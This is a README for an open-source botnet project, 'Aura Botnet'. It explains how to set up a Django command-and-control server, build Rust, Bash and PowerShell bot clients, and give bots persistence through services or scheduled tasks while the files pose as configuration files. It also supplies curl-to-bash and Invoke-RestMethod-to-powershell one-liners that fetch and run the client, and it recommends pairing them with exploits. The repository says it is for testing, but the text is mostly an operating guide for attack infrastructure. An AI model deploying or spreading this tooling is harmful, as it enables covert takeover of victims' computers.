# Aura Botnet

C2 Server
---
The botnet's C2 server utilizes the Django framework as the backend.
It is far from the most efficient web server, but this is offset by the
following:
* Django is extremely portable and therefore good for testing/educational
purposes. The server and database are contained within the `django-server`
folder.
* Django includes a very intuitive and powerful admin site that can be used
for managing bots and commands
* The server is only handling simple POST requests and returning text
* Static files should be handled by a separate web server (local or remote) that
excels in serving static files, such as nginx

The admin site located at `http://your_server:django_port/admin` can be
accessed after setting up a superuser (see below).

Database
---
The Django server is currently configured to use a SQLite3 database,
`bots.sqlite3`. The current configuration can be changed in the *settings.py*
file under `django-server/aura`. You may wish to use MySQL, or even PostgreSQL
instead; this easy to do thanks to Django's portable database API.

Bot Clients
---
The primary clients for Windows and Linux are written in Rust. Alternate clients
are written in Bash and Powershell.

The client will gather relevant system information and send it to the C2 server
to register the new bot. Identification is done by initially creating a file
containing random data -- referred to as the *seed* throughout the code -- which
will then be hashed each time the client runs to identify the client and
authenticate with the C2 server. It will then install all the files in the
folder specified in the code, and initialize the system service or schedule a
task with the same privileges that the client was run with. The default settings
have the client and other files masquerading as configuration files.

Getting Started: C2 Server
---
The Docker image can be found [here](https://hub.docker.com/r/watersalesman/aura-c2/).
Follow the instructions below to run the server normally.

To initialize the SQLite3 database, simply change into the `django-server`
directory and run:
```
./manage.py migrate
```
After the database is initialized, create a superuser for the admin site by
running
```
./manage.py createsuperuser
```
More information on configuring database
and the admin site can be found in the following
[tutorial](https://docs.djangoproject.com/en/1.11/intro/tutorial02/)
and [documentation](https://docs.djangoproject.com/en/1.11/ref/databases/).

Finally, run the following to start the server:
```
./runserver.sh
```
`runserver.sh` is just a wrapper around `manage.py runserver` with some default
options that runs the server on port 41450. This can be easily edited or
bypassed altogether.

Geting Started: Bot Clients
---
You can choose whichever client you feel is most appropriate for the platoform
and use case.

For the Rust client, you will need Rust installed on the platform that you wish
to compile for. Unfortunately, there is no simple method of cross-compiling that
I am aware of. Go into the source directory (`client/rust-linux` or
`client/rust-windows`) and run:
```
cargo build --release
```
The binary will be sent to `client/rust-*/target/release/`.

For the Linux C++ client, change into the source directory and run:
```
cmake .
make
```
For the Windows C++ client, you can find various methods of using Cmake on
Windows [here](http://preshing.com/20170511/how-to-build-a-cmake-based-project/).

The Powershell and Bash clients simply need to be executed on the target
machine.

The client executable or script need to be run in the same folder as
any necessary components (systemd services for Linux clients and launcher.vbs
for Powershell) on the target machine, or installed via web delivery (see
below).

Configuring Commands
---

These can easily be managed through the Django shell or admin site. The
client periodically communicate with the specified server using POST
requests to receive a command (default is every 5 minutes). Commands can be set
to run for specific bot groups defined by operating system and user privilege.
This is specified in `django-server/groups.json`. The only reserved group
numbers are `-1`, for priority commands that are run by all bots, and `-2`, for
default commands that are run by all bots only if there is no other command to run;
you can also assign commands to individual bots using the hash of their seed.
Each command can be given a start time and end time. Oneshot commands will only
run once on each bot.

Client Web Delivery
---
The *static* folder can be used to store files to be served by a web server --
preferably an nginx server running on a different port or host as your Django
server. You will need to compile and place the files into the folders, and edit
the index files to reflect any changes like the server name. The simplicity of
executing via web delivery makes it easy to integrate with exploits that run
arbitrary code. An example in bash would be:

```
curl http://static-server-name/welcome/linux/rust | bash
```
In Powershell:
```
Invoke-RestMethod http://static-server-name/welcome/windows/rust | powershell
```

This will run the client with the current privileges, install any necessary
files, and cleanup the downloaded files.

Other Notes
---
Because this is for testing purposes, the C2 server needs to be
hard-coded into client and web delivery files. It is currently set to
*localhost* on all the files. This is because an actual botnet would use something
like a domain generation algorithm (DGA) to sync a stream of changing domains on
the client side with a stream of disposable domains being registered -- or just
really bulletproof hosting like the original Mirai botnet.

The code is also not obfuscated nor is there any effort put toward preventing
reverse engineering; this would defeat the purpose of being a botnet for
testing and demonstrations.

The *killswitch* folder contains scripts for easy client removal when testing
on your devices.

TODO
---
- Merge Linux and Windows C++ clients
- Cleanup code styling and optimize Django views
- Add support for "modules" to be run easily on arbitrary clients. E.g.: Start
an interactive shell, grab arbitrary system files, install keylogger, spread
using various exploits etc.
- Create clients for mobile devices
- Implement compatibility with running C2 server as a hidden Tor service

<h2>This repo is for testing purposes only. This is not meant to be
implemented in any real world applications except for demonstrations.</h2>
